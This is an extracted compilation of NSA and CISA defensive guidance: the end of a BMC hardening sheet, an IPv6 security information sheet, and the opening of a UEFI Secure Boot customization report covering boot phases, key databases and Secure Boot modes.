Older server and cloud nodes may lack any BMC integrity monitoring mechanism. The presence
of a TPM does not guarantee that BMC integrity data is collected. Place sensitive workloads on
hardware designed to audit both the BMC firmware and the platform firmware [CPG 2.L].
7. Use firmware scanning tools periodically
Some modern EDR and platform scanning tools support BMC firmware capture. Establish a
schedule to collect and inspect BMC firmware for integrity and unexpected changes. Include
firmware audits in comprehensive anti-malware scanning tasks.
8. Do not ignore BMCs
A user may accidentally connect and expose an ignored and disconnected BMC to malicious
content. Treat an unused BMC as if it may one day be activated. Apply patches. Harden
credentials. Restrict network access. If a BMC cannot be disabled or removed, carry out
recommended actions appropriate to the sensitivity of the platform
s data [CPG 1.E, 2.C, 2.F,
2.K, 2.W, 2.X].
Works cited
[1] Eclypsium Inc. (2022), 
The iLOBleed Implant: Lights Out Management Like You Wouldn
Believe.
 https://eclypsium.com/2022/01/12/the-ilobleed-implant-lights-out-management-like-youwouldnt-believe
[2] National Institute of Standards and Technology (NIST) (2020), Special Publication 800-63B
Digital Identity Guidelines: Authentication and Lifecycle Management.
https://pages.nist.gov/800-63-3/sp800-63b.html
[3] National Security Agency (NSA) (2018), 
UEFI Defensive Practices Guidance.
https://www.nsa.gov/portals/75/documents/what-we-do/cybersecurity/professional-resources/ctruefi-defensive-practices-guidance.pdf
U/OO/164464-23 | PP-23-1426 | JUN 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA, CISA | Harden Baseboard Management Controllers
Disclaimer of endorsement
The information and opinions contained in this document are provided "as is" and without any warranties or
guarantees. Reference herein to any specific commercial products, process, or service by trade name, trademark,
manufacturer, or otherwise, does not constitute or imply its endorsement, recommendation, or favoring by the United
States Government, and this guidance shall not be used for advertising or product endorsement purposes.
Purpose
This document was developed in furtherance of the authoring agencies
 cybersecurity missions, including their
responsibilities to identify and disseminate threats and to develop and issue cybersecurity specifications and
mitigations. This information may be shared broadly to reach all appropriate stakeholders.
Contact
Cybersecurity Report Feedback: CybersecurityReports@nsa.gov
General Cybersecurity Inquiries: Cybersecurity_Requests@nsa.gov
Defense Industrial Base Inquiries and Cybersecurity Services: DIB_Defense@cyber.nsa.gov
CISA's 24/7 Operations Center to report incidents and anomalous activity: Report@cisa.gov or (888) 282-0870
Media Inquiries / Press Desk:
NSA Media Relations: 443-634-0721, MediaRelations@nsa.gov
CISA Media Relations: 703-235-2010, CISAMedia@cisa.dhs.gov
U/OO/164464-23 | PP-23-1426 | JUN 2023 Ver. 1.0
TLP:CLEAR
National Security Agency | Cybersecurity Information Sheet
IPv6 Security Guidance
Executive summary
Nearly all networked devices use the Internet Protocol (IP) for their communications. IP
version 6 (IPv6) is the current version of IP and provides advantages over the legacy IP
version 4 (IPv4). Most notably, the IPv4 address space is inadequate to support the
increasing number of networked devices requiring routable IP addresses, whereas IPv6
provides a vast address space to meet current and future needs.
While some technologies, such as network infrastructure, are more affected by IPv6
than others, nearly all networked hardware and software are affected in some way as
well. As a result, IPv6 has broad impact on cybersecurity that organizations should
address with due diligence.
IPv6 security issues are quite similar to those from IPv4. That is, the security methods
used with IPv4 should typically be applied to IPv6 with adaptations as required to
address the differences with IPv6. Security issues associated with an IPv6
implementation will generally surface in networks that are new to IPv6, or in early
phases of the IPv6 transition.
These networks lack maturity in IPv6 configurations and network security tools. More
importantly, they lack overall experience by the administrators in the IPv6 protocol. Dual
stacked networks (that run both IPv4 and IPv6 simultaneously) have additional security
concerns, so further countermeasures are needed to mitigate these risks due to the
increased attack surface of having both IPv4 and IPv6.
U/OO/105622-23 | PP-22-1805 | JAN 2023 Ver. 1.0
NSA | IPv6 Security Guidance
Introduction
Federal and Department of Defense networks are moving from legacy IPv4 to IPv6only. During this transition, IPv4 will continue to be used, and many networks will
operate dual stack (running both IPv4 and IPv6 protocols simultaneously) as an interim
solution toward an IPv6-only end state. However, operating dual stack increases
operational burden and the attack surface. System owners and administrators should
implement cybersecurity mechanisms on both IP protocols to protect the network.
The network architecture and knowledge of those who configure and manage an IPv6
implementation have a big impact on the overall security of the network. As a result, the
actual security posture of an IPv6 implementation can vary.
IPv6 security concerns and recommendations
To get a good start in implementing IPv6 networks and their potential security concerns,
NSA recommends the following:
Auto-configuration
Stateless address auto-configuration (SLAAC) is an automatic method to self-assign an
IPv6 address to a host. In some cases, such as for important servers, static addresses
may be preferred, but allowing devices to automatically self-assign or request an IPv6
address dynamically is easier in most cases. In SLAAC, a host configures its own
network address based on a network prefix received from a router. The assigned IPv6
address incorporates media access control (MAC) address information from the network
interface and may allow for host identification via interface ID, network interface card, or
host vendor. This leads to privacy concerns by linking movements to a specific device
and deducing an individual associated with that equipment, as well as exposing the
types of equipment used in a network.
NSA recommends assigning addresses to hosts via a Dynamic Host Configuration
Protocol version 6 (DHCPv6) server to mitigate the SLAAC privacy issue. Alternatively,
this issue can also be mitigated by using a randomly generated interface ID (RFC 4941
 Privacy Extensions for Stateless Address Auto-configuration in IPv6) [1] that changes
over time, making it difficult to correlate activity while still allowing network defenders
requisite visibility.
U/OO/105622-23 | PP-22-1805 | JAN 2023 Ver. 1.0
NSA | IPv6 Security Guidance
Automatic tunnels
Tunneling is a transition technique that allows one protocol to be transported, or
tunneled, within another protocol. For example, a tunnel can be used to transport IPv6
packets within IPv4 packets. A network might use tunneling for its Internet connection,
and some devices or apps might be designed to tunnel IPv6 traffic. Some operating
systems will automatically establish an IPv6 tunnel when a client connects to a server,
potentially causing an unwanted entry point to the host.
Unless transition tunnels are required, NSA recommends avoiding tunnels to reduce
complexity and the attack surface. Configure perimeter security devices to detect and
block tunneling protocols that are used as transition methods. In addition, disable
tunneling protocols (6to4 [2], ISATAP [3], Teredo [4], etc.) on all devices where
possible. Tunneling protocols can be allowed if they are required during a transition, but
they should be limited to only approved systems where their usage is well understood
and where they are explicitly configured.
Dual stack
A dual stack environment exists when devices run both IPv4 and IPv6 protocols
simultaneously. This is a preferred method for staged IPv6 deployment, but it can be
more expensive and tends to increase the attack surface. This approach provides a
transition method to IPv6 because it allows devices to use IPv6 for communications that
support IPv6 while maintaining the ability to use IPv4 for communications that do not
support IPv6. As IPv6 deployments increase, a dual stack environment will transition to
IPv6-focused operations by increasing the use of IPv6 and decreasing the use of IPv4.
When deploying a dual stack network, organizations should implement IPv6
cybersecurity mechanisms that achieve parity with their IPv4 mechanisms or better. For
any security mechanism implemented for IPv4, a corresponding security mechanism
should be implemented for IPv6, with the IPv6 mechanism addressing any differences
for IPv6. [5] For example, firewall rules that filter higher level protocols (such as TCP or
UDP) should be applied to both IPv6 and IPv4 protocols. Many modern network security
mechanisms support both IPv4 and IPv6, although administrators should verify specific
product compatibility. Also, other transition mechanisms, such as tunneling and
translation, should be avoided at this step in the transition strategy as they add transport
and cybersecurity complexities.
U/OO/105622-23 | PP-22-1805 | JAN 2023 Ver. 1.0
NSA | IPv6 Security Guidance
Hosts with multiple IPv6 addresses
Unlike IPv4, multiple network addresses are commonly assigned to an interface in IPv6.
Multiple addresses create a wider attack surface than a single address. Generating
filtering rules or access control lists (ACLs) can be a challenge. It also requires firewalls
and intermediate security devices to be aware of all of the addresses in order to be
effective.
To mitigate this concern, carefully review ACLs to ensure they deny all traffic by default,
so only traffic from authorized addresses are permitted through the firewalls and other
security devices. Ensure all traffic is logged, and review the logs on a regular basis to
ensure the allowed traffic matches the organization's policies.
IPv6 education
A successfully secured IPv6 network requires, at a minimum, a fundamental knowledge
of the differences between the IPv4 and IPv6 protocols and how they operate. The lack
of this knowledge could lead to IPv6 misconfigurations. Misconfigured IPv6-enabled
devices (resulting from an error in the configuration) could introduce vulnerabilities,
making the devices more prone to compromise.
Learning the IPv6 protocol and knowing how to configure IPv6 effectively are the most
critical things to protect and enhance IPv6 security on a network. NSA recommends
ensuring all network administrators have received the proper training and education to
adequately administer IPv6 networks.
Additional considerations
While there are convincing reasons to transition from IPv4 to IPv6, security is not the
main motivation. Security risks exist in IPv6 and will be encountered, but they should be
mitigated with a combination of stringently applied configuration guidance and training
for system owners and administrators during the transition. In addition to the potential
security issues previously described, what follows is a list of additional considerations to
secure IPv6 networks:
Use split domain name system (Split DNS)
The Domain Name System (DNS) has been expanded for IPv6 with a new AAAA record
that provides IPv6 addresses in addition to the A record that provides IPv4 addresses.
U/OO/105622-23 | PP-22-1805 | JAN 2023 Ver. 1.0
NSA | IPv6 Security Guidance
Therefore, a dual stack DNS implementation may need to support both A and AAAA
records. Due to SLAAC and other mechanisms, sensitive information could be included
in the AAAA records for internal hosts. Split DNS uses two separate DNS servers
created for the same domain, one for the external network and one for the internal
network. The goal of split DNS, as opposed to a single DNS, is to increase security and
privacy by not inadvertently exposing sensitive information in a DNS record from the
internal network to the external network. NSA recommends implementing split DNS, for
both IPv4 and IPv6 networks.
Filter IPv6 traffic (boundary protection)
IPv6 traffic should be filtered according to the organization's network policies. A network
that has not yet deployed IPv6 should block all IPv6 at the network border, including any
IPv6 that is tunneled in IPv4. A network that has deployed IPv6 should only allow IPv6
traffic that is permitted by policy, with ACLs allowing authorized flows and protocols and
blocking all others by default. Although the IPv6 filtering policy may be based on an
existing IPv4 policy, the IPv6 policy should reflect IPv6-specific issues. In addition, the
filtering policy should reflect that Internet Control Message Protocol for IPv6 (ICMPv6) is
more fundamental to IPv6 communications than the corresponding ICMP for IPv4.
Specific ICMPv6 messages, such as neighbor discovery and router advertisement, may
need to be permitted even if the corresponding message in ICMP for IPv4 is blocked. [6]
Protect the local link
IPv6 defines network functions that operate on the local link. This includes link-layer
address resolution, router discovery, and stateless auto-configuration of addresses. [8]
[9] Compared to IPv4, local-link operations for IPv6 are more complex and provide more
attack surface. Therefore, any relevant mitigations (i.e., Router Advertisement (RA)
Guard [10] [11] to protect against rogue RA messages, Dynamic Host Configuration
Protocol for IPv6 (DHCPv6) Shield [12] to protect against rogue DHCPv6 servers)
provided by switches and routers should be considered.
Avoid network address and protocol translation
IPv6-only networks will likely implement translation, such as NAT64/DNS64 (Network
Address Translation between IPv6 hosts and IPv4 servers synthesizes DNS AAAA
records from A records) or 464XLAT (translation between IPv4 private addresses, IPv6
U/OO/105622-23 | PP-22-1805 | JAN 2023 Ver. 1.0
NSA | IPv6 Security Guidance
addresses, and IPv4 global addresses), to communicate with other networks that do not
yet support IPv6. As dual stack and IPv6-only deployments increase, translation use will
decrease, and eventually, the translation functions will no longer be used and can be
removed.
Other than using NAT64/DNS64 [13] [14] or 464XLAT [15] for IPv6-only networks,
address translation should generally not be used. In particular, many IPv4 networks use
NAT, specifically NAT44, to translate between internal and external addresses. On the
other hand, IPv6 networks should instead use global addresses on all systems that
require external communications and non-routable addresses inside the network. If
unique local addresses [16] are used on internal systems, any system that requires
external communications should also have a global address.
Plan for IPv6 stumbling blocks
As with all network changes, new security issues or variations of existing ones, will arise
during the transition to IPv6. As described in this cybersecurity information sheet,
addressing the issues up front in IPv6 implementation plans, configuration guidance,
and appropriate training of administrators will aid organizations to avoid security pitfalls
during the transition and to leverage IPv6 benefits properly.
Works cited
[10]
Narten, T., Draves, R., Krishna S. (2007), Privacy Extension for Stateless Address
Autoconfiguration in IPv6, RFC 4941. https://datatracker.ietf.org/doc/html/rfc4941
Carpenter, B. and Moore, K. (2001), Connection of IPv6 Domains via IPv4 Clouds, RFC 3056.
https://datatracker.ietf.org/rfc/rfc3j056.html
Templin, F., Gleeson, T., and Thaler, D. (2008), Intra-Site Automatic Tunnel Addressing Protocol
(ISATAP), RFC 5214. https://datatracker.ietf.org/doc/rfc5214
Huitema, C. (2006), Teredo: Tunneling IPv6 over UDP through Network Address Translations
(NATs), RFC 4380. https://datatracker.ietf.org/doc/html/rfc4380
National Institute of Standards and Technology (NIST) (2010), SP 800-119 Guidelines for the
Secure Deployment of IPv6.
https://nvlpubs.nist.gov/nistpubs/legacy/sp/nistspecialpublication800-119.pdf
Davies, E. and Mohacsi, J. (2007), Recommendations for Filtering ICMPv6 Messages in
Firewalls, RFC 4890. https://datatracker.ietf.org/doc/rfc4890/
Chittimaneni, K., Chown, T., Howard, L., Kuarsingh, V., Pouffary, Y., and Vyncke, E. (2014),
Enterprise IPv6 Deployment Guidelines, RFC 7381. https://datatracker.ietf.org/doc/rfc7381/
Narten, T., Nordmark, E., Simpson, W., and Soliman, H. (2007), Neighbor Discovery for IP
version 6 (IPv6), RFC 4861. https://datatracker.ietf.org/doc/rfc4861
Thomson, S., Narten, T., and Jinmei, T. (2007), IPv6 Stateless Address Autoconfiguration, RFC
4862. https://datatracker.ietf.org/doc/rfc4862/
Levy-Abegnoli, E., Van de Velde, G., Popoviciu, C., and Mohacsi, J. (2011), IPv6 Router
Advertisement Guard, RFC 6105. https://datatracker.ietf.org/doc/html/draft-ietf-v6ops-ra-guard
U/OO/105622-23 | PP-22-1805 | JAN 2023 Ver. 1.0
NSA | IPv6 Security Guidance
[11]
[12]
[13]
[14]
[15]
[16]
Gont, F. (2014), Implementation Advice for IPv6 Router Advertisement Guard (RA-Guard), RFC
7113. https://datatracker.ietf.org/doc/rfc7113
Gont, F., Liu, W., and Van de Velde, G. (2015), DHCPv6-Shield: Protecting against Rogue
DHCPv6 Servers, RFC 7610. https://datatracker.ietf.org/doc/rfc7610
Bagnulo, M., Matthews, P., and van Beijnum, I. (2011), Stateful NAT64: Network Address and
Protocol Translation from IPv6 Clients to IPv4 Servers, RFC 6146.
https://datatracker.ietf.org/doc/rfc6146
Bagnulo, M., Sullivan, A., Matthews, P., and van Beijnum, I. (2011), DNS64: DNS Extensions for
Network Address Translation from IPv6 Clients to IPv4 Servers, RFC 6147.
https://datatracker.ietf.org/doc/rfc6146
Mawatari, M., Kawashima, M., and Byrne, C., 464XLAT: Combination of Stateful and Stateless
Translation, RFC 6877, 2013. https://datatracker.ietf.org/doc/rfc6877/
Hinden, R. and Haberman, B., Unique Local IPv6 Unicast Addresses, RFC 4193, 2005.
https://www.rfc-editor.org/rfc/rfc4193
Disclaimer of endorsement
The information and opinions contained in this document are provided "as is" and without any warranties or guarantees. Reference
herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or otherwise, does not
constitute or imply its endorsement, recommendation, or favoring by the United States Government, and this guidance shall not be
used for advertising or product endorsement purposes.
Purpose
This document was developed in furtherance of NSA
s cybersecurity missions, including its responsibilities to identify and
disseminate threats to National Security Systems, Department of Defense, and Defense Industrial Base information systems, and to
develop and issue cybersecurity specifications and mitigations. This information may be shared broadly to reach all appropriate
stakeholders.
Contact
Report Feedback / General Cybersecurity Inquiries: CybersecurityReports@nsa.gov
Defense Industrial Base Inquiries and Cybersecurity Services: DIB_Defense@cyber.nsa.gov
Media Inquiries / Press Desk: 443-634-0721, MediaRelations@nsa.gov
U/OO/105622-23 | PP-22-1805 | JAN 2023 Ver. 1.0
National Security Agency
Cybersecurity Technical Report
UEFI Secure Boot
Customization
March 2023 ver. 1.2
S/N: U/OO/168873-20
PP-23-0464
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
Notices and history
Document change history
Date
Version
Description
15 September 2020
Publication release.
16 September 2020
Updated server UEFI hash interface image and text.
14 March 2023
Updated DB and DBX hash calculation information in section
4.3.3 to correctly handle EFI (PE/EFL) format.
Disclaimer of warranties and endorsement
The information and opinions contained in this document are provided "as is" and without any
warranties or guarantees. Reference herein to any specific commercial products, process, or
service by trade name, trademark, manufacturer, or otherwise, does not necessarily constitute or
imply its endorsement, recommendation, or favoring by the United States Government. The views
and opinions of authors expressed herein do not necessarily state or reflect those of the United
States Government, and shall not be used for advertising or product endorsement purposes.
Trademark recognition
Dell, EMC, Dell EMC, iDRAC, Optiplex, and PowerEdge are registered trademarks of Dell, Inc.
HP, HPE, HP Enterprise, iLO, and ProLiant are registered trademarks of Hewlett-Packard
Company.
Linux is a registered trademark of Linus Torvolds.
Microsoft, Hyper-V, Surface, and Windows are registered trademarks of Microsoft Corporation.
Red Hat, Red Hat Enterprise Linux (RHEL), CentOS, and Fedora are registered trademarks of
Red Hat, Inc.
VMware and ESXI are registered trademarks of VMware, Inc.
Trusted Computing Group, TCG, Trusted Platform Module, TPM, and related specifications are
property of the Trusted Computing Group.
Unified Extensible Firmware Interface, UEFI, UEFI Forum, and related specifications are
property of the UEFI Forum.
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
Publication information
Author(s)
National Security Agency
Cybersecurity Directorate
Endpoint Security Division
Platform Security Section
Contact information
Client Requirements / General Cybersecurity Inquiries:
Cybersecurity Requirements Center, 410-854-4200, Cybersecurity_Requests@nsa.gov
Media inquiries / Press Desk:
Media Relations, 443-634-0721, MediaRelations@nsa.gov
Purpose
This document was developed in furtherance of NSA's cybersecurity missions. This includes its
responsibilities to identify and disseminate threats to National Security Systems, Department of
Defense information systems, and the Defense Industrial Base, and to develop and issue
cybersecurity specifications and mitigations. This information may be shared broadly to reach all
appropriate stakeholders.
Additional resources
Please visit the NSA Cybersecurity GitHub at https://www.github.com/nsacyber/Hardware-andFirmware-Security-Guidance for additional resources relating to UEFI Secure Boot and the
customization process.
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
Executive summary
Secure Boot is a boot integrity feature that is part of the Unified Extensible Firmware Interface
(UEFI) industry standard. Most modern computer systems are delivered to customers with a
standard Secure Boot policy installed. This document provides a comprehensive guide for
customizing a Secure Boot policy to meet several use cases.
UEFI is a replacement for the legacy Basic Input Output System (BIOS) boot mechanism. UEFI
provides an environment common to different computing architectures and platforms. UEFI also
provides more configuration options, improved performance, enhanced interfaces, security
measures to combat persistent firmware threats, and support for a wider variety of devices and
form factors.
Malicious actors target firmware to persist on an endpoint. Firmware is stored and executes from
memory that is separate from the operating system and storage media. Antivirus software, which
runs after the operating system has loaded, is ineffective at detecting and remediating malware
in the early-boot firmware environment that executes before the operating system. Secure Boot
provides a validation mechanism that reduces the risk of successful firmware exploitation and
mitigates many published early-boot vulnerabilities.
Secure Boot is frequently not enabled due to issues with incompatible hardware and software.
Custom certificates, signatures, and hashes should be utilized for incompatible software and
hardware. Secure Boot can be customized to meet the needs of different environments.
Customization enables administrators to realize the benefits of boot malware defenses, insider
threat mitigations, and data-at-rest protections. Administrators should opt to customize Secure
Boot rather than disable it for compatibility reasons. Customization may 
 depending on
implementation 
 require infrastructures to sign their own boot binaries and drivers.
Recommendations for system administrators and infrastructure owners:
Machines running legacy BIOS or Compatibility Support Module (CSM) should be
migrated to UEFI native mode.
Secure Boot should be enabled on all endpoints and configured to audit firmware modules,
expansion devices, and bootable OS images (sometimes referred to as Thorough Mode).
Secure Boot should be customized, if necessary, to meet the needs of organizations and
their supporting hardware and software.
Firmware should be secured using a set of administrator passwords appropriate for a
device's capabilities and use case.
Firmware should be updated regularly and treated as importantly as operating system and
application updates.
A Trusted Platform Module (TPM) should be leveraged to check the integrity of firmware
and the Secure Boot configuration.
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
Contents
Notices and history .......................................................................................................................ii
Document change history ........................................................................................................................................ii
Disclaimer of warranties and endorsement ......................................................................................................ii
Trademark recognition ..............................................................................................................................................ii
Publication information................................................................................................................iii
Author(s) ........................................................................................................................................................................iii
Contact information ...................................................................................................................................................iii
Purpose ..........................................................................................................................................................................iii
Additional resources .................................................................................................................................................iii
Executive summary ...................................................................................................................... iv
Contents.......................................................................................................................................... v
1 Unified Extensible Firmware Interface (UEFI) ........................................................................ 1
2 UEFI Secure Boot ...................................................................................................................... 2
2.1 Platform-Specific Caveats ............................................................................................................................... 4
3 Use Cases For Secure Boot ..................................................................................................... 5
3.1 Anti-Malware ......................................................................................................................................................... 5
3.2 Insider Threat Mitigation .................................................................................................................................. 6
3.3 Data-at-Rest ......................................................................................................................................................... 7
4 Customization ............................................................................................................................ 7
4.1 Dependencies ...................................................................................................................................................... 7
4.2 Backup Factory Values .................................................................................................................................... 8
4.2.1 Backup Secure Boot Values.................................................................................................................. 9
4.2.2 EFI Signature List (ESL) Format........................................................................................................ 11
4.3 Initial Provisioning of Certificates and Hashes ..................................................................................... 12
4.3.1 Create Keys and Certificates .............................................................................................................. 13
4.3.2 Sign Binaries .............................................................................................................................................. 14
4.3.3 Calculate and Capture Hashes .......................................................................................................... 15
4.3.4 Load Keys and Hashes ......................................................................................................................... 17
4.4 Updates and Changes .................................................................................................................................... 22
4.4.1 Update the PK ........................................................................................................................................... 22
4.4.2 Update a KEK ............................................................................................................................................ 22
4.4.3 Update the DB or DBX ........................................................................................................................... 23
4.4.4 Update MOK or MOKX .......................................................................................................................... 23
4.5 Validation ............................................................................................................................................................. 23
5. Advanced Customizations..................................................................................................... 24
5.1 Trusted Platform Module (TPM) ................................................................................................................. 24
5.2 Trusted Bootloader .......................................................................................................................................... 26
6 References ................................................................................................................................ 27
6.1 Cited Resources ............................................................................................................................................... 27
6.2 Command References.................................................................................................................................... 27
6.3 Uncited Related Resources.......................................................................................................................... 27
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
7 Appendix ................................................................................................................................... 28
7.1 UEFI Lockdown Configuration .................................................................................................................... 28
7.2 Acronyms ............................................................................................................................................................. 30
7.3 Frequently Asked Questions (FAQ) .......................................................................................................... 32
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
1 Unified Extensible Firmware Interface (UEFI)
Unified Extensible Firmware Interface (UEFI) is an interface that exists between platform
hardware and software. UEFI is defined and updated via specifications maintained by the UEFI
Forum industry body. Support for UEFI is a requirement for some newer software and hardware.
Legacy boot solutions, such as Basic Input/Output System (BIOS), are being phased out in 2020
(Shilov 2017).
UEFI defines a consistent Application Programming Interface (API) and a set of environment
variables common to all UEFI platforms. Uniformity enables OS, driver, and application
developers to build for UEFI regardless of platform, architecture, vendor, or assortment of system
components. Manufacturers and developers can take advantage of UEFI
s extensibility to create
additional features, add new product support, and create protocols to support emerging solutions.
Legacy BIOS involves a wide variety of unique implementations, update solutions, and
interpretations of platform services (e.g. Advanced Configuration and Power Interface (ACPI)).
UEFI establishes a standard that separates portions of code into modules, defines mechanisms
for module interaction, and empowers component vendors to reuse modules across product lines.
Modules also enable vendors to swap out content via updates that can be delivered remotely over
commercial infrastructure management and update solutions (Golden 2017).
UEFI boot occurs in standards-defined phases (UEFI Forum 2017). Figure 1 shows an overview
of the phases. The SEC, PEI, DXE, and BDS phases are handled by platform firmware. The
Bootloader and OS Kernel phases are handled by software.
UEFI Boot Phases
Security Phase
(SEC)
Pre-EFI Init
Phase (PEI)
Driver eXecution
Environment
(DXE)
Boot Device
Select (BDS)
Bootloader
OS Kernel
 Initialize Static
Root of Trust for
Measurement
(SRTM)
 Perform firmware
integrity checks
 Initialize Core
Root of Trust for
Measurement
(CRTM), CPU,
chipset, RAM,
protocols,
handlers, built-in
devices
 Begin firmwarecontrolled Secure
Boot
 Discover I/O
buses, expansion
components (e.g.
RAID, NIC,
USB), and device
firmware
 Execute firmware
modules
 Parallel
execution for
speed
 Initialize UEFI
system table,
boot manager,
apps (e.g. UEFI
shell, UEFI
config), network
connections,
remote
management
 Read bootable
EFI partitions
 SHIM, GRUB,
SysLinux, Boot
Manager for
Windows,
rEFInd, and other
bootable binaries
 Can directly boot
kernels
 Begin softwarecontrolled Secure
Boot
 Set up initial
filesystem,
system modules,
policies, drivers,
and apps
 Init OS runtime
environment and
user experience
layer
 Kernel enforces
Secure Boot for
driver signing
Boot Process
Figure 1 - An enumeration of UEFI firmware and software boot phases.
Legacy BIOS has been part of the computing ecosystem since 1975. UEFI entered the standards
and commercial world in 2005 after having existed as an internal Intel Corporation project for
many years prior (referred to as Extensible Firmware Interface 
 EFI). The UEFI Forum and
vendor partners recognized the potential for disruption migrating from BIOS to UEFI would cause
on the computing industry and established products. Therefore, UEFI implementations historically
have offered the following operating modes to meet customer needs:
UEFI Native Mode is UEFI without any accommodation for legacy devices. UEFI makes
changes to the way devices and components execute their firmware and access system
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
resources as compared to older BIOS implementations. Native mode implements pure
UEFI and requires devices, components, and software to be UEFI-ready. UEFI Native
Mode is a requirement for utilizing UEFI Secure Boot.
Legacy BIOS Mode or Compatibility Support Module (CSM) are accommodations for
devices and components that are not designed for use with UEFI. BIOS behavior is
emulated to allow devices incompatible with UEFI's architectural and access control
paradigms to be used on modern systems. Leveraging legacy mode or CSM reintroduces
security, access control, and memory vulnerabilities addressed by the UEFI standard and
prohibits the use of UEFI Secure Boot.
2 UEFI Secure Boot
Secure Boot is a feature added to UEFI specification 2.3.1. Each binary (module, driver, kernel,
etc.) used during boot must be validated before execution. Validation involves checking for the
presence of a signature that can be validated by a certificate or by computing a SHA-256 hash
that matches a trusted hash. Several value stores are used to identify content that is trusted or
untrusted. Figure 2 shows the sequence of checks. The value stores are:
Platform Key (PK) is the master hierarchy key certificate. Only one PK may exist on the
system as a RSA-2048 public key certificate. In the most secure usage, PKs are unique
per endpoint and maintained by the endpoint owner or infrastructure operators. The PK
private key can sign UEFI environment variable changes or KEK, DB, and DBX changes
that can be validated by the PK certificate. The PK cannot be used for signing executable
binaries that are checked at boot time. Keep the PK private key secure and store it on a
different device.
Note: A PK certificate must be in place for Secure Boot to begin enforcement.
Some vendors ship devices with random PKs or a common/shared PK. Endpoint
owners may also install their own PK as part of the customization process.
Carefully consider the balance between administrative overhead and security. A
unique PK per endpoint provides greater security against UEFI compromise
across an infrastructure, but may reduce the speed at which administrators
can deploy changes compared to a common/shared PK.
Key Exchange Keys (KEKs) are normally used by vendors, such as the system vendor
and the OS vendor, who have a need to update the DB or DBX. One or more KEKs are
typically present on a system as RSA-2048 public key certificates. Different endpoints may
have the same KEK(s) 
 they are not unique to an endpoint. KEKs may sign changes to
the DB and DBX. KEKs can also be used to sign bootable content. However, replacing a
KEK is difficult because involvement from the PK is required. Therefore, KEKs should only
be used to make changes to the DB and DBX. Remember to keep the KEK private key
secure.
Allow list Database (DB) can contain SHA-256 hashes or RSA 2048 public key
certificates. Binaries that have signatures that can be validated by a certificate will be
allowed to execute at boot time. Likewise, binaries with computed SHA-256 hashes that
match a trusted hash will also be allowed to boot even in the absence of a signature.
Deny list Database (DBX) can contain SHA-256 hashes or RSA 2048 public key
certificates. The DBX has ultimate veto power at boot time. Any binary hash that
matches a DBX hash or has a signature verified by a DBX certificate will be prevented
from executing at boot time. DBX is normally leveraged to target errantly signed binaries
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
such as malware or debug bootloaders. DBX is normally checked first (except when
MOKX is present; see below).
Machine Owner Key (MOK) is not part of the UEFI Secure Boot standard. MOK is used
by Linux implementations. MOK functions identically to the DB and becomes initialized by
the pre-bootloader Shim. Linux distributions utilize MOK keys to sign their own binaries
rather than utilizing the process of having Microsoft or Original Equipment Manufacturers
(OEM) sign every update or variation. Shim is signed by Microsoft and therefore works on
most computers supporting Secure Boot Standard Mode. MOK can store SHA-256 hashes
and RSA public key certificates. Some Linux kernels leverage MOK for driver signing
checks instead of or in addition to DB, DBX, and KEK.
Machine Owner Key Deny list (MOKX) is also not part of the UEFI Secure Boot standard.
MOKX exists in Linux implementations and functions like the DBX. The bootloader Shim
is responsible for initializing MOKX. Some Linux kernels leverage MOKX for driver signing
checks instead of or in addition to DBX. MOKX is normally checked first when present
 even before the DBX.
Figure 2 shows the order of operations during UEFI Secure Boot checks. MOKX and DBX are
checked first since they have absolute veto power. If no match is made after checking the KEK(s),
a binary is assumed to be untrusted. Reaching a denied (or unknown/no match) state only blocks
the object that was checked 
 boot continues for other binaries.
UEFI Secure Boot Check Priority
MOKX
Deny
Deny
Allow
Allow
Allow
No Match
Deny
Figure 2 - Order of operations during UEFI Secure Boot checks. Checks contained within dashed lines only take
place when the Shim bootloader is used AND after its initialization in the UEFI bootloader phase (i.e. firmware
OROMs are not checked against MOKX and MOK; kernels are checked against MOKX and MOK).
Vendor implementations of Secure Boot typically have the first three operating modes:
Standard Mode enforces signature and hash checks on boot time executables. Standard
mode is the default configuration for most modern computers, particularly those shipping
with Microsoft Windows installed. A Microsoft KEK and pair of Microsoft DB certificates 
one for validating Microsoft products and another for products evaluated by Microsoft 
make up the minimal Standard Mode configuration. DBX hashes representing errantly
signed or revoked boot time binaries are also typically included. System vendors may
include their own KEK and/or DB certificate. Standard Mode supports many versions of
Windows, Linux distributions, and a wide variety of hardware and software solutions.
Note: Switching to Standard Mode may set Secure Boot to factory default values
and remove any custom values.
User/Custom Mode also enforces signature and hash checks on boot time executables.
However, unlike Standard Mode, Custom Mode allows the system owner to narrow or
expand the selection of trusted hardware and software solutions by changing the contents
of the Secure Boot PK, KEK, DB, and/or DBX data stores. Endpoint administrators may
append new certificates and hashes to Secure Boot, or they may also remove, replace, or
clear existing certificates and hashes. Custom Mode allows endpoints to be configured to
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
trust a narrow selection of hardware and software trusted by the owner, or expand upon
the Standard Mode ecosystem.
Disabled Mode does not utilize Secure Boot validation, so any well-structured EFI binary
will execute at boot regardless of hashes or signatures. Disabled mode is the default in
Legacy or Compatibility Support Module (CSM) modes.
Setup Mode may be an option while a system does not have a PK installed. Setup mode
typically allows for KEK, DB, and DBX values to be readily manipulated as the system
owner 
claims ownership
 of the Secure Boot implementation. Establishing a PK will drop
the system out of Setup Mode and into User/Custom Mode at the next boot.
